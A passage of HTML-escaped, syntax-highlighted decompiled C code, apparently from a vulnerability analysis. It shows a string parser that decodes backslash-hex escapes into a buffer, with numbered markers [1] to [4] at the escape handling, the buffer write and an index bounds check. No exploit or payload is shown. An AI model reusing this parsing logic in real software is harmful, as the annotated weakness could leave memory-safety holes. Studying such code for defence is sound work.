  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdatalen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;,&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\\&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//----------------------[1]&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;a&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;A&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v17&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;a&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------------------[2]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;LOWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(),&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!&amp;lt;=&amp;gt;~;*+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1F&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7F&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(),&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!&amp;lt;=&amp;gt;~;*+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-----------------------[3]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1F&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7F&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos; &apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_35:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//----------------------[4] &lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
